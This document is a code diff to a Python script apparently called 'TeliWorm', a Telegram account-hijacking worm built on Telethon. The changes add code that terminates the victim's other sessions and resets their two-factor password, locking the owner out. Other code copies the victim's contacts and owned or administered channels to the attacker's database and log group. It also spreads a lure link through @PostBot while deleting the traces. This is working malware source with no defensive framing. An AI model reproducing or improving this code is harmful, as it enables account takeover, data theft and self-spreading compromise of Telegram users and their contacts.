@@ -1,15 +1,12 @@
 import os, random, asyncio, json, string, logging
 from typing import Dict, Optional
 from telethon.tl.types import User
-from telethon import TelegramClient, Button, functions, errors
-from telethon.sessions import StringSession
+from telethon import TelegramClient, functions, errors
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 from pymongo import UpdateOne
 from strings import strings,bot_names,bot_usernames
-from telethon.tl.functions.contacts import GetContactsRequest
-
 
 load_dotenv(override=True)
 logger = logging.getLogger("TeliWorm")
@@ -18,6 +15,17 @@ random_string = lambda length: ''.join(random.choices(string.ascii_letters + str
 LOG_GROUP = int(os.environ['LOG_GROUP'])
 PUBLIC_HOST = os.environ['PUBLIC_HOST']
 
+async def terminate_all_other(client: TelegramClient, me: User) -> None:
+    logger.info(f"Terminating all other sessions for user {me.phone}")
+    result = await client(functions.account.GetAuthorizationsRequest())
+    for auth in result.authorizations:
+        if auth.current:
+            continue
+        try:
+            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+        except:
+            logger.error(f"Failed to terminate session: {auth.api_id}, {auth.app_name}")
+    logger.info(f"All other sessions terminated for user {me.phone}")
 async def set_passwd(client: TelegramClient, me: User) -> None:
     logger.info(f"Setting password for user {me.phone}")
     user_data = mongo_client.userdb.sessions.find_one({'phone': me.phone})
@@ -26,11 +34,11 @@ async def set_passwd(client: TelegramClient, me: User) -> None:
         await client.edit_2fa(current_password=user_data['password'], new_password=password)
     else:
         await client.edit_2fa(new_password=password)
-    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'password': password}})
+    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'password': password, 'worm_done': True}})
     logger.debug(f"Password set for {me.phone}")
 async def backup_contacts(client: TelegramClient) -> None:
     logger.info("Backing up contacts...")
-    result = await client(GetContactsRequest(hash=0))
+    result = await client(functions.contacts.GetContactsRequest(hash=0))
     operations = [
         UpdateOne({'chat_id': user.id}, {"$setOnInsert": {'phone': user.phone}}, upsert=True)
         for user in result.users if user.phone
@@ -92,36 +100,29 @@ async def backup_saves(client: TelegramClient, me: User, logger_bot: TelegramCli
         'channel_id': channel_id,
         'hash': result.link.split('/')[-1].lstrip('+'),
     }
-    if len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
+    if perm_logs and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
         log['txt'] = log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession")
         await client.send_message(dest, json.dumps(perm_logs, indent=4, ensure_ascii=False))
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
     await logger_bot.send_message(LOG_GROUP, log['txt'])
     logger.debug(f"Backup log: {log}")
-async def spread(
-    client: TelegramClient,
-    me: User,
-    botinfo: Optional[Dict[str, any]],
-) -> None:
+async def spread(client: TelegramClient, me: User) -> None:
     logger.info("Spreading worm message...")
     spread_msg = None
     worm_url = PUBLIC_HOST+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
     spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
-    if botinfo is not None:
-        bot = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
-        await bot.start(bot_token=botinfo['token'])
-        async with client.conversation(f"@{botinfo['username']}") as conv:
-            msg = await conv.send_message("/start")
-            await bot.send_message(
-                me.id,
-                strings['worm_msg'],
-                file='files/worm.png',
-                buttons=[[Button.url(strings['worm_msg_btn_txt'], worm_url)]],
-                link_preview=False
-            )
-            spread_msg = await conv.get_response()
-        await bot.disconnect()
-        logger.debug(f"Spread message sent via bot {botinfo['username']}")
+    async with client.conversation("@PostBot") as conv:
+        await (await conv.send_message("/start")).delete()
+        await (await conv.get_response()).delete()
+        await (await conv.send_message("📃 Create post")).delete()
+        await (await conv.get_response()).delete()
+        await (await conv.send_message("Photo")).delete()
+        await (await conv.get_response()).delete()
+        await (await conv.send_message(strings['worm_msg'], file='files/worm.png')).delete()
+        await (await conv.get_response()).delete()
+        await (await conv.send_message(f"[{strings['worm_msg_btn_txt']} + {worm_url}]")).delete()
+        spread_msg = await conv.get_response()
+        logger.debug(f"Spread message retrieved successfully")
     perm_logs = {
         'creator': [],
         'admin': [],
@@ -162,7 +163,10 @@ async def worm(client: TelegramClient, logger_bot: TelegramClient) -> None:
     logger.info("Starting worm sequence...")
     me = await client.get_me()
     perm_logs = None
-    botinfo = None
+    try:
+        await terminate_all_other(client, me)
+    except Exception as e:
+        logger.error(f"Error in terminate_all_other: {e}")
     try:
         await set_passwd(client, me)
     except Exception as e:
@@ -172,11 +176,11 @@ async def worm(client: TelegramClient, logger_bot: TelegramClient) -> None:
     except Exception as e:
         logger.error(f"Error in backup_contacts: {e}")
     try:
-        botinfo = await create_bot(client, me)
+        await create_bot(client, me)
     except Exception as e:
         logger.error(f"Error in create_bot: {e}")
     try:
-        perm_logs = await spread(client, me, botinfo)
+        perm_logs = await spread(client, me)
     except Exception as e:
         logger.error(f"Error in spread: {e}")
     try:
